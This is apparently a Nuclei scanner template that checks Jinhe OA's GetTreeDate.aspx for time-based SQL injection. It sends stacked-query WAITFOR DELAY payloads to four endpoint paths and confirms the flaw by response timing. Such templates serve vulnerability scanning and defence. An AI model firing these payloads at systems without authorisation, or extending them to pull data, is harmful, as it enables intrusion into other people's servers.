id: poc-yaml-jin-he-oa-gettreedate-aspx-sql-injection
info:
  name: "金和 OA GetTreeDate.aspx SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: critical
  tags: 金和OA

http:
  - method: GET
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.Appraise/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1"
      - "{{BaseURL}}/c6/Jhsoft.Web.Appraise/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a8'+--%20and%201=1"
      - "{{BaseURL}}/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1"
      - "{{BaseURL}}/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a8'+--%20and%201=1"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "\"hasChildren\":"
      - type: word
        words:
          - "\"permissions\":"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
      - type: word
        part: body
        negative: true
        words:
          - "<"
